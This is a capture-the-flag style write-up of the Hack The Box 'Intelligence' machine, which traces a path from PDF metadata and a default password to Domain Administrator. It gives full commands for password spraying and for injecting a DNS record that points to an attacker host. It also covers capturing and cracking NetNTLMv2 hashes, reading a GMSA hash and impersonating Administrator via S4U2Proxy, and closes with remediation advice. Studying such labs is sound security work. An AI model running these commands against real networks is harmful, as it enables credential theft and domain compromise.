---
title: "Intelligence — PDF Metadata to GMSA Silver Ticket via DNS Injection"
description: "PDF metadata and a default onboarding password enable DNS record injection and NTLM capture, then GMSA silver-ticket abuse reaches Domain Administrator."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - pdf-metadata
  - dns-injection
  - ntlm-capture
  - gmsa
  - silver-ticket
objective: "Escalate from unauthenticated web content enumeration to Domain Administrator through DNS injection and GMSA constrained-delegation abuse."
tools:
  - nmap
  - exiftool
  - kerbrute
  - NetExec
  - smbclient
  - dnstool
  - Responder
  - hashcat
  - BloodHound
  - bloodyAD
  - Impacket
skill: "Active Directory attack-path analysis from information disclosure to delegated service-account abuse"
outcome: "Domain Administrator command execution as `nt authority\\system` on the domain controller"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Active Directory domain controller (IIS web server, DNS, SMB) |
| Starting position | Unauthenticated network access |
| Objective | Escalate from unauthenticated web content enumeration to Domain Administrator through DNS injection and GMSA constrained-delegation abuse |
| Outcome | Domain Administrator command execution as `nt authority\system` on the domain controller |

## From PDF metadata to GMSA delegation abuse

Intelligence is a Medium-rated Hack The Box Windows Active Directory lab whose path begins with information disclosure: PDF documents on an IIS web server expose author metadata that enumerates valid domain users, and one document discloses a default onboarding password. An SMB share reachable with those credentials holds a PowerShell script that authenticates to any internal hostname beginning with `web`; registering a spoofed DNS record redirects its next authenticated request to a listening Responder, which captures the NetNTLMv2 authentication. Cracking that hash yields a higher-privileged user with `ReadGMSAPassword` rights over a Group Managed Service Account; the GMSA's NTLM hash, combined with its constrained delegation rights, allows a service ticket to be requested that impersonates the Administrator. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **PDF metadata enumeration → default onboarding password → authenticated SMB access → `downdetector.ps1` analysis → spoofed DNS record → NetNTLMv2 capture and crack → BloodHound enumeration → GMSA password read → service ticket via S4U2Proxy → Domain Administrator**

## An IIS domain controller and no starting credentials

- **Target:** Windows Active Directory domain controller hosting an IIS web application, DNS, Kerberos, LDAP, and SMB.
- **Services exposed:** DNS (53), HTTP/IIS (80), Kerberos (88), RPC (135), NetBIOS (139), LDAP (389/636), SMB (445).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from unauthenticated enumeration of web content to domain administrative control; information disclosure and a legitimate automation script combine into a full compromise.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: metadata enumeration to GMSA ticket abuse

### 1. Service Enumeration

Observation: a service/version scan exposes the standard Active Directory footprint of the domain controller, including an IIS web server.

```bash
nmap -sC -sV -oA nmap/intelligence <TARGET_IP>
```

Significance: the fingerprint confirms an AD domain controller with DNS, Kerberos, LDAP, SMB, and an IIS web server, defining the domain (`<TARGET_DOMAIN>`) and domain controller host (`<DOMAIN_CONTROLLER_HOST>`).

Result: the reachable services are enumerated and the web server is identified as the first unauthenticated attack surface.

### 2. PDF Metadata Enumeration

Observation: the IIS web server hosts downloadable PDF documents following the naming pattern `YYYY-MM-DD-upload.pdf`; a date-range sweep discovers approximately 84 documents, and extracting their author metadata yields around 30 unique usernames.

Action: enumerate all possible dates across a realistic range and download matching PDFs.

```python
import requests
from datetime import date, timedelta

base = "http://<TARGET_IP>/documents/{date}-upload.pdf"
start = date(2020, 1, 1)
end   = date(2021, 12, 31)

d = start
while d <= end:
    url = base.format(date=d.strftime("%Y-%m-%d"))
    r = requests.get(url)
    if r.status_code == 200:
        with open(d.strftime("%Y-%m-%d") + ".pdf", "wb") as f:
            f.write(r.content)
        print(f"[+] {url}")
    d += timedelta(days=1)
```

Action: extract author metadata from the downloaded documents, then validate the discovered usernames against the domain via Kerberos user enumeration.

```bash
for pdf in *.pdf; do
    exiftool "$pdf" | grep "Creator\|Author" | awk '{print $NF}'
done | sort -u > users.txt
kerbrute userenum --dc <TARGET_IP> -d <TARGET_DOMAIN> users.txt
```

Significance: author metadata is an information-leakage vector: documents published without stripped metadata expose valid internal usernames, and the validated list spares the password spray from guessing at invalid names.

Result: approximately 30 unique usernames are recovered from PDF metadata and confirmed as valid domain accounts through Kerberos user enumeration.

### 3. Default Password Discovery and Initial Access

Observation: one PDF (`2020-06-04-upload.pdf`) contains an onboarding document with a default password in plain text.

Action: spray the disclosed default password across the discovered usernames.

```bash
nxc smb <TARGET_IP> -u users.txt -p '<DEFAULT_PASSWORD>' --continue-on-success
```

Truncated spray output:

```text
[+] <TARGET_DOMAIN>\<LAB_USER>:<DEFAULT_PASSWORD>
```

Significance: a published onboarding document made a usable credential accessible to anyone who could download PDFs, and the metadata-derived username list converted it into authenticated domain access.

Result: valid domain credentials are recovered for `<LAB_USER>` and authentication succeeds over SMB.

### 4. SMB Enumeration and PowerShell Script Discovery

Observation: authenticated SMB access exposes two readable shares, `IT` and `Users`, and the `IT` share contains a PowerShell script, `downdetector.ps1`.

Action: enumerate shares and retrieve the script.

```bash
nxc smb <TARGET_IP> -u '<LAB_USER>' -p '<DEFAULT_PASSWORD>' --shares
smbclient //<TARGET_IP>/IT -U '<LAB_USER>%<DEFAULT_PASSWORD>' -c 'recurse ON; prompt OFF; mget *'
```

Share listing:

```text
Share           Permissions    Remark
-----           -----------    ------
IT              READ
Users           READ
```

The retrieved script contains:

```powershell
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=<TARGET_DOMAIN_COMPONENT>" -Filter * |
        Where-Object {$_.Name -like "web*"}) {
    try {
        $request = Invoke-WebRequest -Uri "http://$($record.Name)" `
            -UseDefaultCredentials
        if($request.StatusCode -ne 200) {
             Send-MailMessage -From '<SERVICE_ACCOUNT> <<SERVICE_ACCOUNT>@<TARGET_DOMAIN>>' `
                             -Subject "Service: $($record.Name) is down" ...
        }
    } catch {}
}
```

Significance: `-UseDefaultCredentials` passes the running account's NTLM credentials to any HTTP endpoint the script contacts, and a Scheduled Task appears to run it periodically. Any DNS record matching `web*` triggers an authenticated HTTP request to that host, whether or not it points to a legitimate server.

Result: the script forwards integrated credentials to any hostname an attacker can register, and that is the path from the low-privileged account to a higher-privileged one.

### 5. DNS Record Injection and NetNTLMv2 Capture

Observation: because the script authenticates to any hostname matching `web*`, a DNS A record named `<SPOOFED_WEB_HOST>` pointing to the attack host redirects the script's next authenticated request to the attacker.

Action: add the spoofed record through Krbrelayx's `dnstool.py` using authenticated DNS updates.

```bash
python3 dnstool.py -u '<TARGET_DOMAIN>\<LAB_USER>' -p '<DEFAULT_PASSWORD>' \
  -r <SPOOFED_WEB_HOST> -d <ATTACKER_IP> --action add <TARGET_IP>
```

```text
[+] <SPOOFED_WEB_HOST> has been successfully added
```

Action: start Responder to capture the authentication, then crack the captured hash.

```bash
sudo responder -I tun0 -v
hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
```

Truncated capture output (hash redacted):

```text
[HTTP] NTLMv2 Hash     : <SERVICE_ACCOUNT>::<TARGET_DOMAIN_SHORT>:<CHALLENGE>:...
```

Truncated crack output:

```text
<SERVICE_ACCOUNT>::<TARGET_DOMAIN_SHORT>:...:<CRACKED_PASSWORD>
```

Significance: the script trusts DNS without validating the target hostname against an allowlist, so a legitimate authenticated DNS write is enough to steer its credentials to an attacker. Secure Dynamic Updates alone do not prevent this, because the record is created with legitimate domain credentials via an authenticated LDAP write.

Result: a NetNTLMv2 authentication for `<SERVICE_ACCOUNT>` is captured and cracked, yielding credentials for a higher-privileged account.

### 6. GMSA Password Read

Observation: with the cracked credentials, BloodHound reveals that `<SERVICE_ACCOUNT>` is a member of `<SUPPORT_GROUP>`, which holds `ReadGMSAPassword` over the Group Managed Service Account `<GMSA_ACCOUNT>`, and that `<GMSA_ACCOUNT>` has constrained delegation to `WWW/<DOMAIN_CONTROLLER_HOST>`.

Action: collect BloodHound data and read the GMSA password attribute.

```bash
bloodhound-ce-python -d <TARGET_DOMAIN> \
  -u '<SERVICE_ACCOUNT>' -p '<CRACKED_PASSWORD>' \
  -c all -ns <TARGET_IP>

bloodyAD --host <TARGET_IP> -d <TARGET_DOMAIN> \
  -u '<SERVICE_ACCOUNT>' -p '<CRACKED_PASSWORD>' \
  get search \
  --filter '(ObjectClass=msDS-GroupManagedServiceAccount)' \
  --attr msDS-ManagedPassword
```

Truncated attribute output (hash redacted):

```text
msDS-ManagedPassword.NTLM: <LM_HASH_EMPTY>:<GMSA_NTLM_HASH>
```

Significance: a gMSA's password is managed automatically by Active Directory and stored in the readable `msDS-ManagedPassword` attribute, so any principal granted explicit `ReadGMSAPassword` rights can retrieve the current NTLM hash. The underlying password is a 256-byte random value rotated every 30 days, but the hash alone is sufficient for NTLM-based authentication and ticket operations.

Result: the NTLM hash of `<GMSA_ACCOUNT>` is retrieved through the group's delegated read right.

### 7. Domain Administrator via S4U2Proxy

Observation: with `<GMSA_ACCOUNT>`'s NTLM hash and its constrained delegation to `WWW/<DOMAIN_CONTROLLER_HOST>`, a service ticket can be requested for the `WWW` service on the domain controller while impersonating the Administrator.

Action: request the service ticket, then use the resulting ccache to authenticate.

```bash
impacket-getST '<TARGET_DOMAIN>/<GMSA_ACCOUNT>' \
  -spn WWW/<DOMAIN_CONTROLLER_HOST> \
  -hashes <LM_HASH_EMPTY>:<GMSA_NTLM_HASH> \
  -impersonate administrator

export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass <TARGET_DOMAIN>/administrator@<DOMAIN_CONTROLLER_HOST>
```

Truncated output:

```text
[*] Saving ticket in administrator.ccache
C:\Windows\system32> whoami
nt authority\system
```

Significance: constrained delegation with protocol transition (S4U2Proxy) lets a service obtain tickets on behalf of any user to its allowed SPN without the user's password. The resulting ticket is scoped to that single SPN, but because the SPN is a service on the domain controller, it yields administrative execution on the DC itself.

Result: the impersonated ticket returns a shell executing as `nt authority\system`, establishing Domain Administrator control.

## Challenges: hidden naming pattern, DNS rights, and task timing

- **Unknown document naming pattern.** I established the `YYYY-MM-DD-upload.pdf` convention from the filenames, so I chose a date-range sweep over wordlist guessing; it systematically recovered the accessible documents. *Documented rationale: the naming pattern made exhaustive date enumeration reliable.*
- **DNS injection needs authenticated writes.** I created the spoofed record with the already-recovered domain credentials; Secure Dynamic Updates alone do not block this because the attack performs an authenticated LDAP write rather than an unauthenticated dynamic update. *Documented rationale: legitimate credentials satisfy DNS update permissions.*
- **Unknown Scheduled Task timing.** I could not verify the script's periodicity, so I waited roughly five minutes and expected the DNS-triggered request to fire. *Documented rationale: patience lets the legitimate trigger fire on its own schedule.*

## Outcome: nt authority system on the domain controller

The documented path runs from unauthenticated enumeration to domain administrative execution, ending in a shell as `nt authority\system` on the domain controller. Document content and a legitimate maintenance script were the pivot points; the static HTTP application was enumeration-only, and no software exploit was required at any stage.

## Recommendations: metadata, default credentials, DNS trust, update rights, and GMSA exposure

These recommendations were not validated during the lab exercise.

1. **Unstripped document metadata (preventive, highest priority).** PDF author/creator fields exposed valid domain usernames that fed the credential spray. *Recommendation:* strip metadata from all publicly published documents before release (for example with `mat2` or the Microsoft Office Document Inspector) and add a pre-publication check for AD user identifiers.
2. **Default credential published in a document (preventive).** An onboarding PDF disclosed a working default password that provided initial domain access. *Recommendation:* never embed shared default credentials in distributed documents; issue unique, one-time onboarding secrets and force a reset on first use. *Detection:* flag a single password being attempted across many accounts.
3. **DNS records trusted by automation (preventive/detective).** `downdetector.ps1` used `Invoke-WebRequest -UseDefaultCredentials`, which forwarded the service account's NTLM credentials to any `web*` hostname. *Recommendation:* avoid Windows Integrated Authentication in scheduled scripts, allowlist the hostnames and address ranges they may contact, and, where NTLM must remain, restrict it via the `Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers` policy. *Detection:* monitor for DNS records created by ordinary users and for outbound NTLM authentication from service accounts to unexpected hosts.
4. **Over-broad DNS update rights (preventive).** Ordinary-domain-user credentials were sufficient to create an arbitrary A record. *Recommendation:* restrict DNS record creation to dedicated service accounts and DNS administrators rather than standard users. *Validation:* enumerate principals with write access on the DNS zone and confirm only intended identities remain.
5. **Excessive GMSA exposure (preventive).** Broader group membership (`<SUPPORT_GROUP>`) granted `ReadGMSAPassword` over `<GMSA_ACCOUNT>`, whose constrained delegation reached a DC SPN. *Recommendation:* reduce `ReadGMSAPassword` grants to the minimum required and review `msDS-AllowedToDelegateTo` on service accounts so no delegation target grants administrative reach on a domain controller. *Validation:* audit GMSA password-read principals and delegation targets together, since the two combined produced full domain compromise.

## References

- [Hack The Box — Intelligence](https://app.hackthebox.com/machines/Intelligence) (retired machine)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [ExifTool](https://exiftool.org/) (document metadata extraction)
- [kerbrute](https://github.com/ropnop/kerbrute) (Kerberos user enumeration)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB enumeration and credential checks)
- [`smbclient` manual page (Samba)](https://samba.org/samba/docs/current/man-html/smbclient.1.html)
- [krbrelayx — `dnstool.py`](https://github.com/dirkjanm/krbrelayx) (authenticated DNS record manipulation)
- [Responder](https://github.com/lgandx/Responder) (rogue authentication server for NetNTLMv2 capture)
- [Hashcat](https://hashcat.net/hashcat/) (NetNTLMv2 cracking, mode 5600)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) (Active Directory attack-path analysis)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) (LDAP attribute reads, including `msDS-ManagedPassword`)
- [Impacket — `getST.py`](https://github.com/fortra/impacket/blob/master/examples/getST.py) (S4U2Proxy service-ticket requests)
- [Group Managed Service Accounts overview (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- [Kerberos constrained delegation overview (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-outgoing-ntlm-traffic-to-remote-servers)
